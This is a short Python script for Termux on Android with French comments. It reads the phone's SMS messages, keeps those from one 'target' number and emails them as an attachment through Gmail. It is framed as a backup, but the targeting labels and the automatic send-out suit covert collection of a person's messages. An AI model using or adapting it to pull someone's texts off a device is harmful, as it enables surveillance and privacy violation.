import subprocess
import json
import smtplib
from email.message import EmailMessage
from datetime import datetime

# ========= CONFIGURATION A-FBI CDM =========
GMAIL_USER = "youremail@gmail.com"
GMAIL_APP_PASSWORD = "your_app_password"
TO_EMAIL = "youremail@gmail.com"

TARGET_NUMBER = "+50912345678"  # 🎯 CIBLE

# ========= LIRE LES SMS A-FBI CDM =========
def get_sms():
    result = subprocess.run(
        ["termux-sms-list", "-l", "500"],
        capture_output=True,
        text=True
    )

    if result.returncode != 0:
        print("❌ Aucun accès SMS (vérifie les permissions)")
        return []

    try:
        messages = json.loads(result.stdout)

        # 🎯 FILTRER PAR NUMÉRO A-FBI CDM
        filtered = [
            msg for msg in messages
            if msg.get("number") == TARGET_NUMBER
        ]

        return filtered

    except Exception as e:
        print("❌ Erreur JSON :", e)
        return []

# ========= CRÉER LE FICHIER DE SAUVEGARDE A-FBI CDM =========
def create_file(messages):
    time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    safe_number = TARGET_NUMBER.replace("+", "").replace(" ", "")
    filename = f"/sdcard/sms_{safe_number}_{time}.txt"

    with open(filename, "w", encoding="utf-8") as f:
        f.write(f"Sauvegarde SMS pour : {TARGET_NUMBER}\n")
        f.write("=" * 50 + "\n\n")

        for msg in messages:
            f.write(f"De : {msg.get('number')}\n")
            f.write(f"Date : {msg.get('received')}\n")
            f.write(f"Type : {msg.get('type')}\n")
            f.write(f"Message : {msg.get('body')}\n")
            f.write("-" * 40 + "\n")

    return filename

# ========= ENVOYER PAR EMAIL A-FBI CDM =========
def send_email(file_path):
    msg = EmailMessage()
    msg["Subject"] = f"Sauvegarde SMS - {TARGET_NUMBER}"
    msg["From"] = GMAIL_USER
    msg["To"] = TO_EMAIL

    msg.set_content("Voici votre sauvegarde filtrée des SMS.")

    with open(file_path, "rb") as f:
        msg.add_attachment(
            f.read(),
            maintype="text",
            subtype="plain",
            filename="sms_backup.txt"
        )

    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
        smtp.login(GMAIL_USER, GMAIL_APP_PASSWORD)
        smtp.send_message(msg)

    print("✅ Email envoyé avec succès !")

# ========= PROGRAMME PRINCIPAL =========
sms = get_sms()

if sms:
    file_path = create_file(sms)
    send_email(file_path)
else:
    print("⚠️ Aucun SMS pour ce numéro ou permission refusée")
